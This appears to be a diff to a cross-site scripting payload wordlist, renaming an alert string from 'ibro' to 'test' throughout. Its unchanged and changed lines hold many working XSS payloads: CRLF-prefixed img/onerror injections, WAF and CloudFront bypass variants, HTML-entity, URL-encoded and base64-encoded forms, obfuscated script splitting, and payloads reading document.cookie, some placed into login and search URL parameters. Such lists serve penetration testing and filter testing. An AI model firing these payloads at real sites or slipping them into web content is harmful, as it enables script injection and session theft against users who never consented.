@@ -11,7 +11,7 @@ $("script(2)")
 ">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>
 %0d%0a%20<body onload=alert("bingo")>
 %0d%0a%20<img src=1 onerror=alert(1)>
-%0d%0a%20<img/src/onerror=alert(ibro`)>
+%0d%0a%20<img/src/onerror=alert(test`)>
 %0d%0a%20"><img src=q onerror=alert(1)>
 %0d%0a%20"><img src=x onerror=prompt(document.domain);>
 %0d%0a%20javascript:alert(1)
@@ -46,7 +46,7 @@ _0x68087f:alert(0x1);
 %20%3Cimg%20src=1%20onerror=alert(1)%3E
 %20<body onload=alert("bingo")>
 %20<img src=1 onerror=alert(1)>
-%20<img/src/onerror=alert(ibro`)>
+%20<img/src/onerror=alert(test`)>
 %20"><img src=q onerror=alert(1)>
 %20"><img src=x onerror=prompt(document.domain);>
 %20javascript:alert(1)
@@ -133,7 +133,7 @@ _0x68087f:alert(0x1);
 %3E'><script>alert(2);</script>
 %3F%20<body onload=alert("bingo")>
 %3F%20<img src=1 onerror=alert(1)>
-%3F%20<img/src/onerror=alert(ibro`)>
+%3F%20<img/src/onerror=alert(test`)>
 %3F%20"><img src=q onerror=alert(1)>
 %3F%20"><img src=x onerror=prompt(document.domain);>
 %3F%20javascript:alert(1)
@@ -258,28 +258,28 @@ amF2YXNjcmlwdDphbGVydCgiWHNzIGJ5IHZpa2FzIik=
 â€&amp;amp;amp;amp;gt;&amp;amp;amp;amp;lt;svg onload=alert&amp;amp;amp;amp;amp;#0000000040"1")&amp;amp;amp;amp;gt;
 "&amp;amp;amp;amp;lt;img src=1 onerror=alert(1)&amp;amp;amp;amp;gt;
 &amp;amp;amp;amp;lt;img src=1 onerror=alert(1)&amp;amp;amp;amp;gt;
-&amp;amp;amp;amp;lt;img/src/onerror=alert(`ibro`)&amp;amp;amp;amp;gt;
+&amp;amp;amp;amp;lt;img/src/onerror=alert(`test`)&amp;amp;amp;amp;gt;
 &amp;amp;amp;amp;lt;script&amp;amp;amp;amp;gt;alert(1)&amp;amp;amp;amp;lt;/script&amp;amp;amp;amp;gt;
 "&amp;amp;amp;gt;&amp;amp;amp;lt;img src=x onerror=prompt(document.domain);&amp;amp;amp;gt;
 "&amp;amp;amp;gt;&amp;amp;amp;lt;svg onload=alert(1)&amp;amp;amp;gt;
 â€&amp;amp;amp;gt;&amp;amp;amp;lt;svg onload=alert&amp;amp;amp;amp;#0000000040"1")&amp;amp;amp;gt;
 "&amp;amp;amp;lt;img src=1 onerror=alert(1)&amp;amp;amp;gt;
 &amp;amp;amp;lt;img src=1 onerror=alert(1)&amp;amp;amp;gt;
-&amp;amp;amp;lt;img/src/onerror=alert(`ibro`)&amp;amp;amp;gt;
+&amp;amp;amp;lt;img/src/onerror=alert(`test`)&amp;amp;amp;gt;
 &amp;amp;amp;lt;script&amp;amp;amp;gt;alert(1)&amp;amp;amp;lt;/script&amp;amp;amp;gt;
 "&amp;amp;gt;&amp;amp;lt;img src=x onerror=prompt(document.domain);&amp;amp;gt;
 "&amp;amp;gt;&amp;amp;lt;svg onload=alert(1)&amp;amp;gt;
 â€&amp;amp;gt;&amp;amp;lt;svg onload=alert&amp;amp;amp;#0000000040"1")&amp;amp;gt;
 "&amp;amp;lt;img src=1 onerror=alert(1)&amp;amp;gt;
 &amp;amp;lt;img src=1 onerror=alert(1)&amp;amp;gt;
-&amp;amp;lt;img/src/onerror=alert(`ibro`)&amp;amp;gt;
+&amp;amp;lt;img/src/onerror=alert(`test`)&amp;amp;gt;
 &amp;amp;lt;script&amp;amp;gt;alert(1)&amp;amp;lt;/script&amp;amp;gt;
 "&amp;gt;&amp;lt;img src=x onerror=prompt(document.domain);&amp;gt;
 "&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt;
 â€&amp;gt;&amp;lt;svg onload=alert&amp;amp;#0000000040"1")&amp;gt;
 "&amp;lt;img src=1 onerror=alert(1)&amp;gt;
 &amp;lt;img src=1 onerror=alert(1)&amp;gt;
-&amp;lt;img/src/onerror=alert(`ibro`)&amp;gt;
+&amp;lt;img/src/onerror=alert(`test`)&amp;gt;
 &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;
 "><a nope="%26quot;x%26quot;"onmouseover="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">
 <a"/onclick=(confirm)()>Click Here!
@@ -408,7 +408,7 @@ document['cookie']
 %E2%80%9C%3E%3CSvG%2Fonload%3Dalert%28document.domain%29%3E
 %E5%98%8D%E5%98%8A%20<body onload=alert("bingo")>
 %E5%98%8D%E5%98%8A%20<img src=1 onerror=alert(1)>
-%E5%98%8D%E5%98%8A%20<img/src/onerror=alert(ibro`)>
+%E5%98%8D%E5%98%8A%20<img/src/onerror=alert(test`)>
 %E5%98%8D%E5%98%8A%20"><img src=q onerror=alert(1)>
 %E5%98%8D%E5%98%8A%20"><img src=x onerror=prompt(document.domain);>
 %E5%98%8D%E5%98%8A%20javascript:alert(1)
@@ -478,7 +478,7 @@ Hex: <svg onload=prompt%26%23x000000028;document.domain)>
 https://me6.com/aem/xss2.svg
 https://twitter.com/xhzeem/status/1378316651431612422
 <i[%00]mg onerror=alert(1) src=a>
-ibro"*alert(1)*"
+test"*alert(1)*"
 <!--[if<img src=x onerror=javascript:alert(1)//]>-->
 <iframe><img title="</iframe><img src onerror=alert(1)>"></iframe>
 "><iframe onload=alert(1);>
@@ -615,9 +615,9 @@ IMG+LOWSRC="javascript:alert(1);">
 <img src="non-existent-image.jpg" onerror="alert(document.cookie);" />
 <img src/onerror=alert(1)>
 <img src=/ onerror=alert(1)>
-"><img/src/onerror=alert(`ibro`)>
-#<img/src/onerror=alert(`ibro`)>
-<img/src/onerror=alert(`ibro`)>
+"><img/src/onerror=alert(`test`)>
+#<img/src/onerror=alert(`test`)>
+<img/src/onerror=alert(`test`)>
 <IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
 <img src onerror /" '"= alt=javascript:alert(1)//">
 <--`<img/src=` onerror=confirm(1)> --!>
@@ -826,13 +826,13 @@ javascript&#x00000003A;alert&#x000000028;2&#x000000029;&#x00000003B;
 <link rel="stylesheet" href="#" onload="window.alert('XSS_WAF_BYPASS')">
 "><link rel="stylesheet" href="style.css"><img src=x onerror=prompt(document.domain);>
 ";location=location.hash)//#0={};alert(0)
-Login.aspx?username=<img/src/onerror=alert(ibro)>
+Login.aspx?username=<img/src/onerror=alert(test)>
 '>&lt;/b&gt;%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Cb&gt;&lt;!--
 '>&lt;/b&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;b&gt;&lt;!--
-#&lt;img&#47;src&#47;onerror=alert(`ibro`)&gt;
+#&lt;img&#47;src&#47;onerror=alert(`test`)&gt;
 "&lt;img src=1 onerror=alert(1)&gt;
 &lt;img src=1 onerror=alert(1)&gt;
-&lt;img/src/onerror=alert(`ibro`)&gt;
+&lt;img/src/onerror=alert(`test`)&gt;
 &lt;img src=x onerror=alert()>
 ">&lt;img src=x onerror=prompt(document.domain);&gt;
 &lt;&lt;img src=x onerror=prompt(document)&gt;&gt;;
@@ -929,7 +929,7 @@ PHN2ZyBvbmxvYWQ9YWxlcnQmYWxlcnQoMjMgKT4=
 PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 PHNjcmlwdD5pbWcgc3JjPXggb25lcnJvci5wcm9tb3RlKHRy
 <?php echo('<SCR'); echo('IPT>alert("XSS")</SCRIPT>'); ?>
-<p><img/src/onerror=alert(`ibro`)></p>
+<p><img/src/onerror=alert(`test`)></p>
 <plaintext onfocus=alert(1) autofocus tabindex=1>	
 </plaintext\></|\><plaintext/onmouseover=prompt(1)
 pods/ppt.aspx?&fileName=')}, 1000); alert('xss')://
@@ -938,7 +938,7 @@ pods/ppt.aspx?&fileName=')}, 1000); alert('xss')://
 <p v-show="_c.constructor`alert(1)`()">
 q="><img/src/onerror=.1|alert`` class=d>
 q=javascript:alert(document.domain)
-?query=<img/src/onerror=alert(`ibro`)>
+?query=<img/src/onerror=alert(`test`)>
 ?query="><img src=x onerror=prompt(document.domain);>
 #&quot;-alert(1)}//
 &quot;&gt;&lt;img src=x onerror=confirm(1);&gt;
@@ -1122,9 +1122,9 @@ ryp3i"accesskey="x"onclick="alert(1)"//opk15
 </scr</script>ipt><ifr<iframeame/onload=prompt()>whs
 <scr<script>ipt>prompt(document.cookie)</scr</script>ipt>
 <sc<script>ript>alert(123)</sc</script>ript>
-search?q=<img/src/onerror=alert(`ibro`)>
+search?q=<img/src/onerror=alert(`test`)>
 search?q=javascript:alert(document.domain)
-Search/Results?q=<img/src/onerror=alert(`ibro`)>
+Search/Results?q=<img/src/onerror=alert(`test`)>
 Search/Results?q="><img src=x onerror=prompt(document.domain);>
 secbreake@gmail.com\u003C/script\u003E\u003Cscript\u003Ealert(document.domain)//
 "></select><img%20src=1%20onerror=alert(1)>
